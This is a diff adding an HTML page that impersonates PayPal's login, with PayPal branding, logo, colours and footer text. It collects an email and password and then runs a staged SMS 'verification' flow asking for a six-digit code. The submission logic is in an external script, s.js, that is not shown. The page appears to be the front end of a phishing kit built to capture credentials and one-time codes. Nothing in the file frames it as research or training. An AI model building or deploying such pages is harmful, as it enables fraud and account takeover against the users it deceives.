@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=PayPal+Sans:wght@400;500;600;700&display=swap">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <style>
+        @font-face {
+            font-family: 'PayPal Sans';
+            src: url('https://fonts.googleapis.com/css2?family=PayPal+Sans:wght@400;500;600;700&display=swap');
+        }
+        body {
+            font-family: 'PayPal Sans', Arial, sans-serif;
+            background-color: #f7f9fa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .paypal-blue {
+            color: #0070ba;
+        }
+        .paypal-input {
+            border: 1px solid #d4d9dd;
+            border-radius: 4px;
+            padding: 12px 15px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        .paypal-input:focus {
+            border-color: #0070ba;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
+        }
+        .paypal-btn {
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .paypal-btn:hover {
+            background-color: #005e9c;
+        }
+        .paypal-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .paypal-btn-secondary {
+            background-color: #f7f9fa;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+        }
+        .paypal-btn-secondary:hover {
+            background-color: #e6f0ff;
+        }
+        .verification-input input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            margin: 0 5px;
+            border: 2px solid #d4d9dd;
+            border-radius: 4px;
+        }
+        .verification-input input:focus {
+            border-color: #0070ba;
+            outline: none;
+        }
+        .verification-option {
+            border: 2px solid #d4d9dd;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .verification-option:hover {
+            border-color: #0070ba;
+            background-color: #f7f9fa;
+        }
+        .verification-option.selected {
+            border-color: #0070ba;
+            background-color: #e6f0ff;
+        }
+        .verification-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e6f0ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: #0070ba;
+        }
+        .selection-circle {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #0070ba;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+        }
+        .selection-circle.selected::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #0070ba;
+        }
+        .footer {
+            background-color: #f7f9fa;
+            border-top: 1px solid #e6e6e6;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #0070ba;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-copyright {
+            text-align: center;
+            color: #6c7378;
+            font-size: 12px;
+        }
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .paypal-loading {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0070ba;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #0070ba;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .security-notice {
+            background-color: #e6f0ff;
+            border: 1px solid #0070ba;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+        }
+        .security-notice i {
+            color: #0070ba;
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        .help-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+        }
+        .help-link i {
+            margin-right: 8px;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        .language-selector select {
+            border: 1px solid #d4d9dd;
+            border-radius: 4px;
+            padding: 8px 12px;
+            background-color: white;
+            font-size: 14px;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #d4d9dd;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 10px;
+            font-weight: 600;
+        }
+        .step.active {
+            background-color: #0070ba;
+        }
+        .step-line {
+            width: 40px;
+            height: 2px;
+            background-color: #d4d9dd;
+            margin-top: 14px;
+        }
+        .step-line.active {
+            background-color: #0070ba;
+        }
+    </style>
+</head>
+<body>
+    <!-- Language Selector -->
+    <div class="language-selector">
+        <select id="languageSelect">
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+        </select>
+    </div>
+
+    <div class="main-content">
+        <!-- Login Page -->
+        <div id="loginPage" class="min-h-screen flex items-center justify-center p-4">
+            <div class="w-full max-w-md">
+                <div class="text-center mb-8">
+                    <div class="flex justify-center mb-6">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal Logo" width="40" height="40">
+                    </div>
+                    <h1 class="text-3xl font-bold text-gray-900">Log in to PayPal</h1>
+                    <p class="text-gray-600 mt-2">Securely log in to your PayPal account</p>
+                </div>
+
+                <!-- Step Indicator -->
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step-line"></div>
+                    <div class="step">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+                
+                <form id="loginForm" class="bg-white rounded-lg shadow-md p-6">
+                    <div class="security-notice">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>We use advanced security to keep your account safe</span>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label for="email" class="block text-gray-700 text-sm font-medium mb-1">Email or mobile number</label>
+                        <input type="text" id="email" class="paypal-input w-full" required placeholder="Enter your email or phone">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label for="password" class="block text-gray-700 text-sm font-medium mb-1">Password</label>
+                        <input type="password" id="password" class="paypal-input w-full" required placeholder="Enter your password" autocomplete="current-password">
+                    </div>
+                    
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center">
+                            <input type="checkbox" id="remember" class="rounded text-blue-600 h-4 w-4">
+                            <label for="remember" class="ml-2 text-sm text-gray-700">Remember me</label>
+                        </div>
+                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
+                    </div>
+                    
+                    <button type="submit" class="paypal-btn w-full py-3" id="loginBtn">
+                        <span id="loginBtnText">Log in</span>
+                        <div id="loginLoading" class="paypal-loading inline-block ml-2" style="display: none; width: 20px; height: 20px; border-width: 2px;"></div>
+                    </button>
+                    
+                    <div class="mt-6 text-center">
+                        <p class="text-sm text-gray-600">Don't have an account? <a href="#" class="text-blue-600 hover:underline">Sign up</a></p>
+                    </div>
+                    
+                    <a href="#" class="help-link">
+                        <i class="fas fa-question-circle"></i>
+                        <span>Having trouble logging in?</span>
+                    </a>
+                </form>
+                
+                <div class="mt-8 text-center text-sm text-gray-600">
+                    <p>By logging in, you agree to PayPal's <a href="#" class="text-blue-600 hover:underline">User Agreement</a> and <a href="#" class="text-blue-600 hover:underline">Privacy Statement</a>.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Verification Method Selection Page (hidden initially) -->
+        <div id="verificationMethodPage" class="min-h-screen flex items-center justify-center p-4" style="display: none;">
+            <div class="w-full max-w-md">
+                <div class="text-center mb-8">
+                    <div class="flex justify-center mb-6">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal Logo" width="40" height="40">
+                    </div>
+                    <h1 class="text-3xl font-bold text-gray-900">Verify your identity</h1>
+                    <p class="text-gray-600 mt-2">We'll send a 6-digit code to your phone</p>
+                </div>
+
+                <!-- Step Indicator -->
+                <div class="step-indicator">
+                    <div class="step">1</div>
+                    <div class="step-line active"></div>
+                    <div class="step active">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+                
+                <div class="bg-white rounded-lg shadow-md p-6">
+                    <div class="security-notice">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>We're sending a secure code to protect your account</span>
+                    </div>
+                    
+                    <div class="mb-6">
+                        <p class="text-gray-700 mb-4">We'll send a 6-digit code via SMS to verify your identity:</p>
+                        
+                        <div class="verification-option selected" id="phoneOption">
+                            <div class="flex items-center">
+                                <div class="selection-circle selected"></div>
+                                <div class="verification-icon">
+                                    <i class="fas fa-mobile-alt"></i>
+                                </div>
+                                <div>
+                                    <h3 class="font-medium">Text message</h3>
+                                    <p class="text-sm text-gray-600">Send code via SMS to your phone</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="flex space-x-4">
+                        <button id="backToLoginBtn" class="paypal-btn paypal-btn-secondary flex-1 py-3">Back</button>
+                        <button id="continueVerificationBtn" class="paypal-btn flex-1 py-3">
+                            <span id="continueBtnText">Continue</span>
+                            <div id="continueLoading" class="paypal-loading inline-block ml-2" style="display: none; width: 20px; height: 20px; border-width: 2px;"></div>
+                        </button>
+                    </div>
+                    
+                    <a href="#" class="help-link">
+                        <i class="fas fa-question-circle"></i>
+                        <span>Need help with verification?</span>
+                    </a>
+                </div>
+                
+                <div class="mt-8 text-center text-sm text-gray-600">
+                    <p>PayPal uses industry-standard security to protect your information.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading Page (hidden initially) -->
+        <div id="loadingPage" class="min-h-screen flex items-center justify-center p-4" style="display: none;">
+            <div class="w-full max-w-md">
+                <div class="text-center mb-8">
+                    <div class="flex justify-center mb-6">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal Logo" width="40" height="40">
+                    </div>
+                </div>
+                
+                <div class="bg-white rounded-lg shadow-md p-8">
+                    <div class="loading-container">
+                        <div class="paypal-loading"></div>
+                        <p class="loading-text">Sending verification code...</p>
+                        <p class="text-gray-600 mt-2">Please wait while we send a 6-digit code to your phone</p>
+                    </div>
+                    
+                    <div class="security-notice mt-6">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>This code helps us verify it's really you</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Verification Page (hidden initially) -->
+        <div id="verificationPage" class="min-h-screen flex items-center justify-center p-4" style="display: none;">
+            <div class="w-full max-w-md">
+                <div class="text-center mb-8">
+                    <div class="flex justify-center mb-6">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal Logo" width="40" height="40">
+                    </div>
+                    <h1 class="text-3xl font-bold text-gray-900">Enter your code</h1>
+                    <p class="text-gray-600 mt-2">A code has been sent to your phone</p>
+                </div>
+
+                <!-- Step Indicator -->
+                <div class="step-indicator">
+                    <div class="step">1</div>
+                    <div class="step-line"></div>
+                    <div class="step">2</div>
+                    <div class="step-line active"></div>
+                    <div class="step active">3</div>
+                </div>
+                
+                <form id="verificationForm" class="bg-white rounded-lg shadow-md p-6">
+                    <div class="security-notice">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Enter the code to complete your secure login</span>
+                    </div>
+                    
+                    <div class="mb-6 text-center">
+                        <p class="text-gray-700">Enter the 6-digit code we sent to <span id="phoneNumber" class="font-medium">***-***-****</span></p>
+                    </div>
+                    
+                    <div class="verification-input flex justify-center mb-6">
+                        <input type="text" id="code1" maxlength="1" class="paypal-input" required>
+                        <input type="text" id="code2" maxlength="1" class="paypal-input" required>
+                        <input type="text" id="code3" maxlength="1" class="paypal-input" required>
+                        <input type="text" id="code4" maxlength="1" class="paypal-input" required>
+                        <input type="text" id="code5" maxlength="1" class="paypal-input" required>
+                        <input type="text" id="code6" maxlength="1" class="paypal-input" required>
+                    </div>
+                    
+                    <div class="mb-6 text-center">
+                        <p class="text-sm text-gray-600">Didn't receive the code? <a href="#" class="text-blue-600 hover:underline">Resend code</a></p>
+                        <p class="text-xs text-gray-500 mt-1">The code will expire in 10 minutes</p>
+                    </div>
+                    
+                    <div class="flex space-x-4">
+                        <button id="backToMethodBtn" type="button" class="paypal-btn paypal-btn-secondary flex-1 py-3">Back</button>
+                        <button type="submit" class="paypal-btn flex-1 py-3" id="verifyBtn">
+                            <span id="verifyBtnText">Verify</span>
+                            <div id="verifyLoading" class="paypal-loading inline-block ml-2" style="display: none; width: 20px; height: 20px; border-width: 2px;"></div>
+                        </button>
+                    </div>
+                    
+                    <div class="mt-6 text-center">
+                        <p class="text-sm text-gray-600">Not you? <a href="#" class="text-blue-600 hover:underline">Try another way</a></p>
+                    </div>
+                    
+                    <a href="#" class="help-link">
+                        <i class="fas fa-question-circle"></i>
+                        <span>Having trouble with the code?</span>
+                    </a>
+                </form>
+                
+                <div class="mt-8 text-center text-sm text-gray-600">
+                    <p>PayPal uses industry-standard security to protect your information.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Contact</a>
+                <a href="#">Fees</a>
+                <a href="#">Security</a>
+                <a href="#">Apps</a>
+                <a href="#">Shop</a>
+                <a href="#">Enterprise</a>
+                <a href="#">Partners</a>
+                <a href="#">Feedback</a>
+            </div>
+            <div class="footer-copyright">
+                <p>Copyright © 1999-2025 PayPal. All rights reserved.</p>
+                <p class="mt-2">PayPal Pte. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="s.js"></script>
+
+</body>
+</html>
